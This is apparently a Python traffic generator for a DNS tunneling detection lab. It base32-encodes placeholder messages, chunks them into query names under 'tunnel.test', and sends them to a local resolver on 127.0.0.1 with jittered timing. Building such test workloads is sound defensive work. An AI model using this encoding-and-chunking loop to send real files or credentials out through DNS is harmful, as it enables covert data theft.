import time
import random
import dns.message
import dns.query

from protocol import encode_base32, chunk_payload, build_query_name


LAB_DOMAIN = "tunnel.test"

messages = [
    "hello dns lab",
    "this is a longer dns tunnel test message",
    "collecting endpoint telemetry for security analysis",
    "simulated confidential data transfer through dns queries",
    "dns tunneling detection laboratory experiment",
    "network security monitoring and anomaly detection test",
    "this session contains a moderately sized encoded payload",
    "longer simulated payload for behavioral detection testing",
]

print("Realistic DNS tunnel workload started.")

session_id = 2001

for message in messages:
    encoded = encode_base32(message)
    chunk_size = random.choice([6, 8, 10])
    chunks = chunk_payload(encoded, chunk_size)

    print("\nSession:", session_id)
    print("Message length:", len(message))
    print("Chunk size:", chunk_size)
    print("Chunks:", len(chunks))

    for sequence, chunk in enumerate(chunks):
        query = build_query_name(
         str(session_id),
         sequence,
         len(chunks),
         chunk,
         LAB_DOMAIN
)
        print("DNS Query:", query)
        
        request = dns.message.make_query(query, "A")
        dns.query.udp(request, "127.0.0.1", port=5353, timeout=2)

        delay = random.uniform(0.08, 0.35)
        time.sleep(delay)

    pause = random.uniform(0.5, 1.5)
    time.sleep(pause)

    session_id += 1

print("\nRealistic DNS tunnel workload complete.")